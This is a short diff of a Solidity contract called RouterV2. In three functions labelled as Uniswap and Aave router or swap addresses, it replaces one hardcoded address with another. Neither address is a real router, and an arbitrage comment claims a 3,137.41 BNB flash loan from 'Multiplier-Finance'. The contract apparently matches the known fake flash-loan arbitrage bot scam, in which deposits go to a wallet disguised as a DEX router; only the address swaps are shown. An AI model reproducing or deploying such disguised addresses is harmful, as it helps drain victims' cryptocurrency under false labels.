@@ -111,7 +111,7 @@ interface IUniswapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0xFf5332ccB10BCC8D83A3F9aae31F81acb40b31f4;
+        return 0xd7658797edD37ad2B54D881c16b089dC707DB123;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function uniswapSwapAddress() public pure returns (address) {
-        return 0xFf5332ccB10BCC8D83A3F9aae31F81acb40b31f4;
+        return 0xd7658797edD37ad2B54D881c16b089dC707DB123;
     }
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
@@ -143,7 +143,7 @@ contract RouterV2 {
     }
 
     function aaveSwapAddress() public pure returns (address) {
-        return 0xFf5332ccB10BCC8D83A3F9aae31F81acb40b31f4;
+        return 0xd7658797edD37ad2B54D881c16b089dC707DB123;
     }
 
     function callArbitrageAAVE(address add0, address add1) public pure {
